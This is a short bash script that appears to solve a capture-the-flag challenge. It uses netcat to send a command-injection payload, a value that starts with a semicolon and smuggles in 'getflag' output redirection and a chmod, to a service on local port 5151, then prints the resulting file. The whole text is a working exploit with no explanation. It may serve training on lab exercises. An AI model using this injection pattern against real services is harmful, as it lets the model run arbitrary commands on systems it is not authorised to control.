#!/bin/bash
echo ";getflag > /tmp/exploit; chmod 555 /tmp/exploit" | nc 127.0.0.1 5151
cat /tmp/exploit
